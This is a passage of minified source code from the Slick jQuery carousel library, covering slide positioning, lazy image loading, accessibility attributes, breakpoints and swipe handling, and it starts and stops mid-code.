            var o = i(this);
            setTimeout(function() {
                e.options.pauseOnFocus && (e.focussed = o.is(":focus"),
                e.autoPlay())
            }, 0)
        })
    }
    ,
    e.prototype.getCurrent = e.prototype.slickCurrentSlide = function() {
        return this.currentSlide
    }
    ,
    e.prototype.getDotCount = function() {
        var i = this
          , e = 0
          , t = 0
          , o = 0;
        if (!0 === i.options.infinite)
            if (i.slideCount <= i.options.slidesToShow)
                ++o;
            else
                for (; e < i.slideCount; )
                    ++o,
                    e = t + i.options.slidesToScroll,
                    t += i.options.slidesToScroll <= i.options.slidesToShow ? i.options.slidesToScroll : i.options.slidesToShow;
        else if (!0 === i.options.centerMode)
            o = i.slideCount;
        else if (i.options.asNavFor)
            for (; e < i.slideCount; )
                ++o,
                e = t + i.options.slidesToScroll,
                t += i.options.slidesToScroll <= i.options.slidesToShow ? i.options.slidesToScroll : i.options.slidesToShow;
        else
            o = 1 + Math.ceil((i.slideCount - i.options.slidesToShow) / i.options.slidesToScroll);
        return o - 1
    }
    ,
    e.prototype.getLeft = function(i) {
        var e, t, o, s, n = this, r = 0;
        return n.slideOffset = 0,
        t = n.$slides.first().outerHeight(!0),
        !0 === n.options.infinite ? (n.slideCount > n.options.slidesToShow && (n.slideOffset = n.slideWidth * n.options.slidesToShow * -1,
        s = -1,
        !0 === n.options.vertical && !0 === n.options.centerMode && (2 === n.options.slidesToShow ? s = -1.5 : 1 === n.options.slidesToShow && (s = -2)),
        r = t * n.options.slidesToShow * s),
        n.slideCount % n.options.slidesToScroll != 0 && i + n.options.slidesToScroll > n.slideCount && n.slideCount > n.options.slidesToShow && (i > n.slideCount ? (n.slideOffset = (n.options.slidesToShow - (i - n.slideCount)) * n.slideWidth * -1,
        r = (n.options.slidesToShow - (i - n.slideCount)) * t * -1) : (n.slideOffset = n.slideCount % n.options.slidesToScroll * n.slideWidth * -1,
        r = n.slideCount % n.options.slidesToScroll * t * -1))) : i + n.options.slidesToShow > n.slideCount && (n.slideOffset = (i + n.options.slidesToShow - n.slideCount) * n.slideWidth,
        r = (i + n.options.slidesToShow - n.slideCount) * t),
        n.slideCount <= n.options.slidesToShow && (n.slideOffset = 0,
        r = 0),
        !0 === n.options.centerMode && n.slideCount <= n.options.slidesToShow ? n.slideOffset = n.slideWidth * Math.floor(n.options.slidesToShow) / 2 - n.slideWidth * n.slideCount / 2 : !0 === n.options.centerMode && !0 === n.options.infinite ? n.slideOffset += n.slideWidth * Math.floor(n.options.slidesToShow / 2) - n.slideWidth : !0 === n.options.centerMode && (n.slideOffset = 0,
        n.slideOffset += n.slideWidth * Math.floor(n.options.slidesToShow / 2)),
        e = !1 === n.options.vertical ? i * n.slideWidth * -1 + n.slideOffset : i * t * -1 + r,
        !0 === n.options.variableWidth && (o = n.slideCount <= n.options.slidesToShow || !1 === n.options.infinite ? n.$slideTrack.children(".slick-slide").eq(i) : n.$slideTrack.children(".slick-slide").eq(i + n.options.slidesToShow),
        e = !0 === n.options.rtl ? o[0] ? -1 * (n.$slideTrack.width() - o[0].offsetLeft - o.width()) : 0 : o[0] ? -1 * o[0].offsetLeft : 0,
        !0 === n.options.centerMode && (o = n.slideCount <= n.options.slidesToShow || !1 === n.options.infinite ? n.$slideTrack.children(".slick-slide").eq(i) : n.$slideTrack.children(".slick-slide").eq(i + n.options.slidesToShow + 1),
        e = !0 === n.options.rtl ? o[0] ? -1 * (n.$slideTrack.width() - o[0].offsetLeft - o.width()) : 0 : o[0] ? -1 * o[0].offsetLeft : 0,
        e += (n.$list.width() - o.outerWidth()) / 2)),
        e
    }
    ,
    e.prototype.getOption = e.prototype.slickGetOption = function(i) {
        return this.options[i]
    }
    ,
    e.prototype.getNavigableIndexes = function() {
        var i, e = this, t = 0, o = 0, s = [];
        for (!1 === e.options.infinite ? i = e.slideCount : (t = -1 * e.options.slidesToScroll,
        o = -1 * e.options.slidesToScroll,
        i = 2 * e.slideCount); t < i; )
            s.push(t),
            t = o + e.options.slidesToScroll,
            o += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
        return s
    }
    ,
    e.prototype.getSlick = function() {
        return this
    }
    ,
    e.prototype.getSlideCount = function() {
        var e, t, o = this;
        return t = !0 === o.options.centerMode ? o.slideWidth * Math.floor(o.options.slidesToShow / 2) : 0,
        !0 === o.options.swipeToSlide ? (o.$slideTrack.find(".slick-slide").each(function(s, n) {
            if (n.offsetLeft - t + i(n).outerWidth() / 2 > -1 * o.swipeLeft)
                return e = n,
                !1
        }),
        Math.abs(i(e).attr("data-slick-index") - o.currentSlide) || 1) : o.options.slidesToScroll
    }
    ,
    e.prototype.goTo = e.prototype.slickGoTo = function(i, e) {
        this.changeSlide({
            data: {
                message: "index",
                index: parseInt(i)
            }
        }, e)
    }
    ,
    e.prototype.init = function(e) {
        var t = this;
        i(t.$slider).hasClass("slick-initialized") || (i(t.$slider).addClass("slick-initialized"),
        t.buildRows(),
        t.buildOut(),
        t.setProps(),
        t.startLoad(),
        t.loadSlider(),
        t.initializeEvents(),
        t.updateArrows(),
        t.updateDots(),
        t.checkResponsive(!0),
        t.focusHandler()),
        e && t.$slider.trigger("init", [t]),
        !0 === t.options.accessibility && t.initADA(),
        t.options.autoplay && (t.paused = !1,
        t.autoPlay())
    }
    ,
    e.prototype.initADA = function() {
        var e = this
          , t = Math.ceil(e.slideCount / e.options.slidesToShow)
          , o = e.getNavigableIndexes().filter(function(i) {
            return i >= 0 && i < e.slideCount
        });
        e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({
            "aria-hidden": "true",
            tabindex: "-1"
        }).find("a, input, button, select").attr({
            tabindex: "-1"
        }),
        null !== e.$dots && (e.$slides.not(e.$slideTrack.find(".slick-cloned")).each(function(t) {
            var s = o.indexOf(t);
            i(this).attr({
                role: "tabpanel",
                id: "slick-slide" + e.instanceUid + t,
                tabindex: -1
            }),
            -1 !== s && i(this).attr({
                "aria-describedby": "slick-slide-control" + e.instanceUid + s
            })
        }),
        e.$dots.attr("role", "tablist").find("li").each(function(s) {
            var n = o[s];
            i(this).attr({
                role: "presentation"
            }),
            i(this).find("button").first().attr({
                role: "tab",
                id: "slick-slide-control" + e.instanceUid + s,
                "aria-controls": "slick-slide" + e.instanceUid + n,
                "aria-label": s + 1 + " of " + t,
                "aria-selected": null,
                tabindex: "-1"
            })
        }).eq(e.currentSlide).find("button").attr({
            "aria-selected": "true",
            tabindex: "0"
        }).end());
        for (var s = e.currentSlide, n = s + e.options.slidesToShow; s < n; s++)
            e.$slides.eq(s).attr("tabindex", 0);
        e.activateADA()
    }
    ,
    e.prototype.initArrowEvents = function() {
        var i = this;
        !0 === i.options.arrows && i.slideCount > i.options.slidesToShow && (i.$prevArrow.off("click.slick").on("click.slick", {
            message: "previous"
        }, i.changeSlide),
        i.$nextArrow.off("click.slick").on("click.slick", {
            message: "next"
        }, i.changeSlide),
        !0 === i.options.accessibility && (i.$prevArrow.on("keydown.slick", i.keyHandler),
        i.$nextArrow.on("keydown.slick", i.keyHandler)))
    }
    ,
    e.prototype.initDotEvents = function() {
        var e = this;
        !0 === e.options.dots && (i("li", e.$dots).on("click.slick", {
            message: "index"
        }, e.changeSlide),
        !0 === e.options.accessibility && e.$dots.on("keydown.slick", e.keyHandler)),
        !0 === e.options.dots && !0 === e.options.pauseOnDotsHover && i("li", e.$dots).on("mouseenter.slick", i.proxy(e.interrupt, e, !0)).on("mouseleave.slick", i.proxy(e.interrupt, e, !1))
    }
    ,
    e.prototype.initSlideEvents = function() {
        var e = this;
        e.options.pauseOnHover && (e.$list.on("mouseenter.slick", i.proxy(e.interrupt, e, !0)),
        e.$list.on("mouseleave.slick", i.proxy(e.interrupt, e, !1)))
    }
    ,
    e.prototype.initializeEvents = function() {
        var e = this;
        e.initArrowEvents(),
        e.initDotEvents(),
        e.initSlideEvents(),
        e.$list.on("touchstart.slick mousedown.slick", {
            action: "start"
        }, e.swipeHandler),
        e.$list.on("touchmove.slick mousemove.slick", {
            action: "move"
        }, e.swipeHandler),
        e.$list.on("touchend.slick mouseup.slick", {
            action: "end"
        }, e.swipeHandler),
        e.$list.on("touchcancel.slick mouseleave.slick", {
            action: "end"
        }, e.swipeHandler),
        e.$list.on("click.slick", e.clickHandler),
        i(document).on(e.visibilityChange, i.proxy(e.visibility, e)),
        !0 === e.options.accessibility && e.$list.on("keydown.slick", e.keyHandler),
        !0 === e.options.focusOnSelect && i(e.$slideTrack).children().on("click.slick", e.selectHandler),
        i(window).on("orientationchange.slick.slick-" + e.instanceUid, i.proxy(e.orientationChange, e)),
        i(window).on("resize.slick.slick-" + e.instanceUid, i.proxy(e.resize, e)),
        i("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault),
        i(window).on("load.slick.slick-" + e.instanceUid, e.setPosition),
        i(e.setPosition)
    }
    ,
    e.prototype.initUI = function() {
        var i = this;
        !0 === i.options.arrows && i.slideCount > i.options.slidesToShow && (i.$prevArrow.show(),
        i.$nextArrow.show()),
        !0 === i.options.dots && i.slideCount > i.options.slidesToShow && i.$dots.show()
    }
    ,
    e.prototype.keyHandler = function(i) {
        var e = this;
        i.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === i.keyCode && !0 === e.options.accessibility ? e.changeSlide({
            data: {
                message: !0 === e.options.rtl ? "next" : "previous"
            }
        }) : 39 === i.keyCode && !0 === e.options.accessibility && e.changeSlide({
            data: {
                message: !0 === e.options.rtl ? "previous" : "next"
            }
        }))
    }
    ,
    e.prototype.lazyLoad = function() {
        function e(e) {
            i("img[data-lazy]", e).each(function() {
                var e = i(this)
                  , t = i(this).attr("data-lazy")
                  , o = i(this).attr("data-srcset")
                  , s = i(this).attr("data-sizes") || n.$slider.attr("data-sizes")
                  , r = document.createElement("img");
                r.onload = function() {
                    e.animate({
                        opacity: 0
                    }, 100, function() {
                        o && (e.attr("srcset", o),
                        s && e.attr("sizes", s)),
                        e.attr("src", t).animate({
                            opacity: 1
                        }, 200, function() {
                            e.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading")
                        }),
                        n.$slider.trigger("lazyLoaded", [n, e, t])
                    })
                }
                ,
                r.onerror = function() {
                    e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),
                    n.$slider.trigger("lazyLoadError", [n, e, t])
                }
                ,
                r.src = t
            })
        }
        var t, o, s, n = this;
        if (!0 === n.options.centerMode ? !0 === n.options.infinite ? s = (o = n.currentSlide + (n.options.slidesToShow / 2 + 1)) + n.options.slidesToShow + 2 : (o = Math.max(0, n.currentSlide - (n.options.slidesToShow / 2 + 1)),
        s = n.options.slidesToShow / 2 + 1 + 2 + n.currentSlide) : (o = n.options.infinite ? n.options.slidesToShow + n.currentSlide : n.currentSlide,
        s = Math.ceil(o + n.options.slidesToShow),
        !0 === n.options.fade && (o > 0 && o--,
        s <= n.slideCount && s++)),
        t = n.$slider.find(".slick-slide").slice(o, s),
        "anticipated" === n.options.lazyLoad)
            for (var r = o - 1, l = s, d = n.$slider.find(".slick-slide"), a = 0; a < n.options.slidesToScroll; a++)
                r < 0 && (r = n.slideCount - 1),
                t = (t = t.add(d.eq(r))).add(d.eq(l)),
                r--,
                l++;
        e(t),
        n.slideCount <= n.options.slidesToShow ? e(n.$slider.find(".slick-slide")) : n.currentSlide >= n.slideCount - n.options.slidesToShow ? e(n.$slider.find(".slick-cloned").slice(0, n.options.slidesToShow)) : 0 === n.currentSlide && e(n.$slider.find(".slick-cloned").slice(-1 * n.options.slidesToShow))
    }
    ,
    e.prototype.loadSlider = function() {
        var i = this;
        i.setPosition(),
        i.$slideTrack.css({
            opacity: 1
        }),
        i.$slider.removeClass("slick-loading"),
        i.initUI(),
        "progressive" === i.options.lazyLoad && i.progressiveLazyLoad()
    }
    ,
    e.prototype.next = e.prototype.slickNext = function() {
        this.changeSlide({
            data: {
                message: "next"
            }
        })
    }
    ,
    e.prototype.orientationChange = function() {
        var i = this;
        i.checkResponsive(),
        i.setPosition()
    }
    ,
    e.prototype.pause = e.prototype.slickPause = function() {
        var i = this;
        i.autoPlayClear(),
        i.paused = !0
    }
    ,
    e.prototype.play = e.prototype.slickPlay = function() {
        var i = this;
        i.autoPlay(),
        i.options.autoplay = !0,
        i.paused = !1,
        i.focussed = !1,
        i.interrupted = !1
    }
    ,
    e.prototype.postSlide = function(e) {
        var t = this;
        t.unslicked || (t.$slider.trigger("afterChange", [t, e]),
        t.animating = !1,
        t.slideCount > t.options.slidesToShow && t.setPosition(),
        t.swipeLeft = null,
        t.options.autoplay && t.autoPlay(),
        !0 === t.options.accessibility && (t.initADA(),
        t.options.focusOnChange && i(t.$slides.get(t.currentSlide)).attr("tabindex", 0).focus()))
    }
    ,
    e.prototype.prev = e.prototype.slickPrev = function() {
        this.changeSlide({
            data: {
                message: "previous"
            }
        })
    }
    ,
    e.prototype.preventDefault = function(i) {
        i.preventDefault()
    }
    ,
    e.prototype.progressiveLazyLoad = function(e) {
        e = e || 1;
        var t, o, s, n, r, l = this, d = i("img[data-lazy]", l.$slider);
        d.length ? (t = d.first(),
        o = t.attr("data-lazy"),
        s = t.attr("data-srcset"),
        n = t.attr("data-sizes") || l.$slider.attr("data-sizes"),
        (r = document.createElement("img")).onload = function() {
            s && (t.attr("srcset", s),
            n && t.attr("sizes", n)),
            t.attr("src", o).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"),
            !0 === l.options.adaptiveHeight && l.setPosition(),
            l.$slider.trigger("lazyLoaded", [l, t, o]),
            l.progressiveLazyLoad()
        }
        ,
        r.onerror = function() {
            e < 3 ? setTimeout(function() {
                l.progressiveLazyLoad(e + 1)
            }, 500) : (t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),
            l.$slider.trigger("lazyLoadError", [l, t, o]),
            l.progressiveLazyLoad())
        }
        ,
        r.src = o) : l.$slider.trigger("allImagesLoaded", [l])
    }
    ,
    e.prototype.refresh = function(e) {
        var t, o, s = this;
        o = s.slideCount - s.options.slidesToShow,
        !s.options.infinite && s.currentSlide > o && (s.currentSlide = o),
        s.slideCount <= s.options.slidesToShow && (s.currentSlide = 0),
        t = s.currentSlide,
        s.destroy(!0),
        i.extend(s, s.initials, {
            currentSlide: t
        }),
        s.init(),
        e || s.changeSlide({
            data: {
                message: "index",
                index: t
            }
        }, !1)
    }
    ,
    e.prototype.registerBreakpoints = function() {
        var e, t, o, s = this, n = s.options.responsive || null;
        if ("array" === i.type(n) && n.length) {
            s.respondTo = s.options.respondTo || "window";
            for (e in n)
                if (o = s.breakpoints.length - 1,
                n.hasOwnProperty(e)) {
                    for (t = n[e].breakpoint; o >= 0; )
                        s.breakpoints[o] && s.breakpoints[o] === t && s.breakpoints.splice(o, 1),
                        o--;
                    s.breakpoints.push(t),
                    s.breakpointSettings[t] = n[e].settings
                }
            s.breakpoints.sort(function(i, e) {
                return s.options.mobileFirst ? i - e : e - i
            })
        }
    }
    ,
    e.prototype.reinit = function() {
        var e = this;
        e.$slides = e.$slideTrack.children(e.options.slide).addClass("slick-slide"),
        e.slideCount = e.$slides.length,
        e.currentSlide >= e.slideCount && 0 !== e.currentSlide && (e.currentSlide = e.currentSlide - e.options.slidesToScroll),
        e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0),
        e.registerBreakpoints(),
        e.setProps(),
        e.setupInfinite(),
        e.buildArrows(),
        e.updateArrows(),
        e.initArrowEvents(),
        e.buildDots(),
        e.updateDots(),
        e.initDotEvents(),
        e.cleanUpSlideEvents(),
        e.initSlideEvents(),
        e.checkResponsive(!1, !0),
        !0 === e.options.focusOnSelect && i(e.$slideTrack).children().on("click.slick", e.selectHandler),
        e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0),
        e.setPosition(),
        e.focusHandler(),
        e.paused = !e.options.autoplay,
        e.autoPlay(),
        e.$slider.trigger("reInit", [e])
    }
    ,
    e.prototype.resize = function() {
        var e = this;
        i(window).width() !== e.windowWidth && (clearTimeout(e.windowDelay),
        e.windowDelay = window.setTimeout(function() {
            e.windowWidth = i(window).width(),
            e.checkResponsive(),
            e.unslicked || e.setPosition()
        }, 50))
    }
    ,
    e.prototype.removeSlide = e.prototype.slickRemove = function(i, e, t) {
        var o = this;
        if (i = "boolean" == typeof i ? !0 === (e = i) ? 0 : o.slideCount - 1 : !0 === e ? --i : i,
        o.slideCount < 1 || i < 0 || i > o.slideCount - 1)
            return !1;
        o.unload(),
        !0 === t ? o.$slideTrack.children().remove() : o.$slideTrack.children(this.options.slide).eq(i).remove(),
        o.$slides = o.$slideTrack.children(this.options.slide),
        o.$slideTrack.children(this.options.slide).detach(),
        o.$slideTrack.append(o.$slides),
        o.$slidesCache = o.$slides,
        o.reinit()
    }
    ,
    e.prototype.setCSS = function(i) {
        var e, t, o = this, s = {};
        !0 === o.options.rtl && (i = -i),
        e = "left" == o.positionProp ? Math.ceil(i) + "px" : "0px",
        t = "top" == o.positionProp ? Math.ceil(i) + "px" : "0px",
        s[o.positionProp] = i,
        !1 === o.transformsEnabled ? o.$slideTrack.css(s) : (s = {},
        !1 === o.cssTransitions ? (s[o.animType] = "translate(" + e + ", " + t + ")",
        o.$slideTrack.css(s)) : (s[o.animType] = "translate3d(" + e + ", " + t + ", 0px)",
        o.$slideTrack.css(s)))
    }
    ,
    e.prototype.setDimensions = function() {
        var i = this;
        !1 === i.options.vertical ? !0 === i.options.centerMode && i.$list.css({
            padding: "0px " + i.options.centerPadding
        }) : (i.$list.height(i.$slides.first().outerHeight(!0) * i.options.slidesToShow),
        !0 === i.options.centerMode && i.$list.css({
            padding: i.options.centerPadding + " 0px"
        })),
        i.listWidth = i.$list.width(),
        i.listHeight = i.$list.height(),
        !1 === i.options.vertical && !1 === i.options.variableWidth ? (i.slideWidth = Math.ceil(i.listWidth / i.options.slidesToShow),
        i.$slideTrack.width(Math.ceil(i.slideWidth * i.$slideTrack.children(".slick-slide").length))) : !0 === i.options.variableWidth ? i.$slideTrack.width(5e3 * i.slideCount) : (i.slideWidth = Math.ceil(i.listWidth),
        i.$slideTrack.height(Math.ceil(i.$slides.first().outerHeight(!0) * i.$slideTrack.children(".slick-slide").length)));
        var e = i.$slides.first().outerWidth(!0) - i.$slides.first().width();
        !1 === i.options.variableWidth && i.$slideTrack.children(".slick-slide").width(i.slideWidth - e)
    }
    ,
    e.prototype.setFade = function() {
        var e, t = this;
        t.$slides.each(function(o, s) {
            e = t.slideWidth * o * -1,
            !0 === t.options.rtl ? i(s).css({
                position: "relative",
                right: e,
                top: 0,
                zIndex: t.options.zIndex - 2,
                opacity: 0
            }) : i(s).css({
                position: "relative",
                left: e,
                top: 0,
                zIndex: t.options.zIndex - 2,
                opacity: 0
            })
        }),
        t.$slides.eq(t.currentSlide).css({
            zIndex: t.options.zIndex - 1,
            opacity: 1
        })
    }
    ,
    e.prototype.setHeight = function() {
        var i = this;
        if (1 === i.options.slidesToShow && !0 === i.options.adaptiveHeight && !1 === i.options.vertical) {
            var e = i.$slides.eq(i.currentSlide).outerHeight(!0);
            i.$list.css("height", e)
        }
    }
    ,
    e.prototype.setOption = e.prototype.slickSetOption = function() {
        var e, t, o, s, n, r = this, l = !1;
        if ("object" === i.type(arguments[0]) ? (o = arguments[0],
        l = arguments[1],
        n = "multiple") : "string" === i.type(arguments[0]) && (o = arguments[0],
        s = arguments[1],
        l = arguments[2],
        "responsive" === arguments[0] && "array" === i.type(arguments[1]) ? n = "responsive" : void 0 !== arguments[1] && (n = "single")),
        "single" === n)
            r.options[o] = s;
        else if ("multiple" === n)
            i.each(o, function(i, e) {
                r.options[i] = e
            });
        else if ("responsive" === n)
            for (t in s)
                if ("array" !== i.type(r.options.responsive))
                    r.options.responsive = [s[t]];
                else {
                    for (e = r.options.responsive.length - 1; e >= 0; )
                        r.options.responsive[e].breakpoint === s[t].breakpoint && r.options.responsive.splice(e, 1),
                        e--;
                    r.options.responsive.push(s[t])
                }
        l && (r.unload(),
        r.reinit())
    }
    ,
    e.prototype.setPosition = function() {
        var i = this;
        i.setDimensions(),
        i.setHeight(),
        !1 === i.options.fade ? i.setCSS(i.getLeft(i.currentSlide)) : i.setFade(),
        i.$slider.trigger("setPosition", [i])
    }
    ,
    e.prototype.setProps = function() {
        var i = this
          , e = document.body.style;
        i.positionProp = !0 === i.options.vertical ? "top" : "left",
        "top" === i.positionProp ? i.$slider.addClass("slick-vertical") : i.$slider.removeClass("slick-vertical"),
        void 0 === e.WebkitTransition && void 0 === e.MozTransition && void 0 === e.msTransition || !0 === i.options.useCSS && (i.cssTransitions = !0),
        i.options.fade && ("number" == typeof i.options.zIndex ? i.options.zIndex < 3 && (i.options.zIndex = 3) : i.options.zIndex = i.defaults.zIndex),
        void 0 !== e.OTransform && (i.animType = "OTransform",
        i.transformType = "-o-transform",
        i.transitionType = "OTransition",
        void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (i.animType = !1)),
        void 0 !== e.MozTransform && (i.animType = "MozTransform",
        i.transformType = "-moz-transform",
        i.transitionType = "MozTransition",
        void 0 === e.perspectiveProperty && void 0 === e.MozPerspective && (i.animType = !1)),
        void 0 !== e.webkitTransform && (i.animType = "webkitTransform",
        i.transformType = "-webkit-transform",
        i.transitionType = "webkitTransition",
        void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (i.animType = !1)),
        void 0 !== e.msTransform && (i.animType = "msTransform",
        i.transformType = "-ms-transform",
        i.transitionType = "msTransition",
        void 0 === e.msTransform && (i.animType = !1)),
        void 0 !== e.transform && !1 !== i.animType && (i.animType = "transform",
        i.transformType = "transform",
        i.transitionType = "transition"),
        i.transformsEnabled = i.options.useTransform && null !== i.animType && !1 !== i.animType
    }
    ,
    e.prototype.setSlideClasses = function(i) {
        var e, t, o, s, n = this;
        if (t = n.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"),
        n.$slides.eq(i).addClass("slick-current"),
        !0 === n.options.centerMode) {
            var r = n.options.slidesToShow % 2 == 0 ? 1 : 0;
            e = Math.floor(n.options.slidesToShow / 2),
            !0 === n.options.infinite && (i >= e && i <= n.slideCount - 1 - e ? n.$slides.slice(i - e + r, i + e + 1).addClass("slick-active").attr("aria-hidden", "false") : (o = n.options.slidesToShow + i,
            t.slice(o - e + 1 + r, o + e + 2).addClass("slick-active").attr("aria-hidden", "false")),
            0 === i ? t.eq(t.length - 1 - n.options.slidesToShow).addClass("slick-center") : i === n.slideCount - 1 && t.eq(n.options.slidesToShow).addClass("slick-center")),
            n.$slides.eq(i).addClass("slick-center")
        } else
            i >= 0 && i <= n.slideCount - n.options.slidesToShow ? n.$slides.slice(i, i + n.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : t.length <= n.options.slidesToShow ? t.addClass("slick-active").attr("aria-hidden", "false") : (s = n.slideCount % n.options.slidesToShow,
            o = !0 === n.options.infinite ? n.options.slidesToShow + i : i,
            n.options.slidesToShow == n.options.slidesToScroll && n.slideCount - i < n.options.slidesToShow ? t.slice(o - (n.options.slidesToShow - s), o + s).addClass("slick-active").attr("aria-hidden", "false") : t.slice(o, o + n.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false"));
        "ondemand" !== n.options.lazyLoad && "anticipated" !== n.options.lazyLoad || n.lazyLoad()
    }
    ,
    e.prototype.setupInfinite = function() {
        var e, t, o, s = this;
        if (!0 === s.options.fade && (s.options.centerMode = !1),
        !0 === s.options.infinite && !1 === s.options.fade && (t = null,
        s.slideCount > s.options.slidesToShow)) {
            for (o = !0 === s.options.centerMode ? s.options.slidesToShow + 1 : s.options.slidesToShow,
            e = s.slideCount; e > s.slideCount - o; e -= 1)
                t = e - 1,
                i(s.$slides[t]).clone(!0).attr("id", "").attr("data-slick-index", t - s.slideCount).prependTo(s.$slideTrack).addClass("slick-cloned");
            for (e = 0; e < o + s.slideCount; e += 1)
                t = e,
                i(s.$slides[t]).clone(!0).attr("id", "").attr("data-slick-index", t + s.slideCount).appendTo(s.$slideTrack).addClass("slick-cloned");
            s.$slideTrack.find(".slick-cloned").find("[id]").each(function() {
                i(this).attr("id", "")
            })
        }
    }
    ,
    e.prototype.interrupt = function(i) {
        var e = this;
        i || e.autoPlay(),
        e.interrupted = i
    }
    ,
    e.prototype.selectHandler = function(e) {
        var t = this
          , o = i(e.target).is(".slick-slide") ? i(e.target) : i(e.target).parents(".slick-slide")
          , s = parseInt(o.attr("data-slick-index"));
        s || (s = 0),
        t.slideCount <= t.options.slidesToShow ? t.slideHandler(s, !1, !0) : t.slideHandler(s)
    }
    ,
    e.prototype.slideHandler = function(i, e, t) {
        var o, s, n, r, l, d = null, a = this;
        if (e = e || !1,
        !(!0 === a.animating && !0 === a.options.waitForAnimate || !0 === a.options.fade && a.currentSlide === i))
            if (!1 === e && a.asNavFor(i),
            o = i,
            d = a.getLeft(o),
            r = a.getLeft(a.currentSlide),
            a.currentLeft = null === a.swipeLeft ? r : a.swipeLeft,
            !1 === a.options.infinite && !1 === a.options.centerMode && (i < 0 || i > a.getDotCount() * a.options.slidesToScroll))
                !1 === a.options.fade && (o = a.currentSlide,
                !0 !== t ? a.animateSlide(r, function() {
                    a.postSlide(o)
                }) : a.postSlide(o));
            else if (!1 === a.options.infinite && !0 === a.options.centerMode && (i < 0 || i > a.slideCount - a.options.slidesToScroll))
                !1 === a.options.fade && (o = a.currentSlide,
                !0 !== t ? a.animateSlide(r, function() {
                    a.postSlide(o)
                }) : a.postSlide(o));
            else {
                if (a.options.autoplay && clearInterval(a.autoPlayTimer),
                s = o < 0 ? a.slideCount % a.options.slidesToScroll != 0 ? a.slideCount - a.slideCount % a.options.slidesToScroll : a.slideCount + o : o >= a.slideCount ? a.slideCount % a.options.slidesToScroll != 0 ? 0 : o - a.slideCount : o,
                a.animating = !0,
                a.$slider.trigger("beforeChange", [a, a.currentSlide, s]),
                n = a.currentSlide,
                a.currentSlide = s,
                a.setSlideClasses(a.currentSlide),
                a.options.asNavFor && (l = (l = a.getNavTarget()).slick("getSlick")).slideCount <= l.options.slidesToShow && l.setSlideClasses(a.currentSlide),
                a.updateDots(),
                a.updateArrows(),
                !0 === a.options.fade)
                    return !0 !== t ? (a.fadeSlideOut(n),
                    a.fadeSlide(s, function() {
                        a.postSlide(s)
                    })) : a.postSlide(s),
                    void a.animateHeight();
                !0 !== t ? a.animateSlide(d, function() {
                    a.postSlide(s)
                }) : a.postSlide(s)
            }
    }
    ,
    e.prototype.startLoad = function() {
        var i = this;
        !0 === i.options.arrows && i.slideCount > i.options.slidesToShow && (i.$prevArrow.hide(),
        i.$nextArrow.hide()),
        !0 === i.options.dots && i.slideCount > i.options.slidesToShow && i.$dots.hide(),
        i.$slider.addClass("slick-loading")
    }
    ,
    e.prototype.swipeDirection = function() {
        var i, e, t, o, s = this;
        return i = s.touchObject.startX - s.touchObject.curX,
        e = s.touchObject.startY - s.touchObject.curY,
        t = Math.atan2(e, i),
        (o = Math.round(180 * t / Math.PI)) < 0 && (o = 360 - Math.abs(o)),
        o <= 45 && o >= 0 ? !1 === s.options.rtl ? "left" : "right" : o <= 360 && o >= 315 ? !1 === s.options.rtl ? "left" : "right" : o >= 135 && o <= 225 ? !1 === s.options.rtl ? "right" : "left" : !0 === s.options.verticalSwiping ? o >= 35 && o <= 135 ? "down" : "up" : "vertical"
    }
    ,
    e.prototype.swipeEnd = function(i) {
        var e, t, o = this;
        if (o.dragging = !1,
        o.swiping = !1,
        o.scrolling)
            return o.scrolling = !1,
            !1;
        if (o.interrupted = !1,
        o.shouldClick = !(o.touchObject.swipeLength > 10),
        void 0 === o.touchObject.curX)
            return !1;
        if (!0 === o.touchObject.edgeHit && o.$slider.trigger("edge", [o, o.swipeDirection()]),
        o.touchObject.swipeLength >= o.touchObject.minSwipe) {
            switch (t = o.swipeDirection()) {
            case "left":
            case "down":
                e = o.options.swipeToSlide ? o.checkNavigable(o.currentSlide + o.getSlideCount()) : o.currentSlide + o.getSlideCount(),
                o.currentDirection = 0;
                break;
            case "right":
            case "up":
                e = o.options.swipeToSlide ? o.checkNavigable(o.currentSlide - o.getSlideCount()) : o.currentSlide - o.getSlideCount(),
                o.currentDirection = 1
            }
            "vertical" != t && (o.slideHandler(e),
            o.touchObject = {},
            o.$slider.trigger("swipe", [o, t]))
        } else
            o.touchObject.startX !== o.touchObject.curX && (o.slideHandler(o.currentSlide),
            o.touchObject = {})
    }
    ,
    e.prototype.swipeHandler = function(i) {
        var e = this;
        if (!(!1 === e.options.swipe || "ontouchend"in document && !1 === e.options.swipe || !1 === e.options.draggable && -1 !== i.type.indexOf("mouse")))
            switch (e.touchObject.fingerCount = i.originalEvent && void 0 !== i.originalEvent.touches ? i.originalEvent.touches.length : 1,
            e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold,
            !0 === e.options.verticalSwiping && (e.touchObject.minSwipe = e.listHeight / e.options.touchThreshold),
            i.data.action) {
            case "start":
                e.swipeStart(i);
                break;
            case "move":
                e.swipeMove(i);
                break;
            case "end":
                e.swipeEnd(i)
            }
    }
    ,
    e.prototype.swipeMove = function(i) {
        var e, t, o, s, n, r, l = this;
        return n = void 0 !== i.originalEvent ? i.originalEvent.touches : null,
        !(!l.dragging || l.scrolling || n && 1 !== n.length) && (e = l.getLeft(l.currentSlide),
        l.touchObject.curX = void 0 !== n ? n[0].pageX : i.clientX,
        l.touchObject.curY = void 0 !== n ? n[0].pageY : i.clientY,
        l.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(l.touchObject.curX - l.touchObject.startX, 2))),
        r = Math.round(Math.sqrt(Math.pow(l.touchObject.curY - l.touchObject.startY, 2))),
        !l.options.verticalSwiping && !l.swiping && r > 4 ? (l.scrolling = !0,
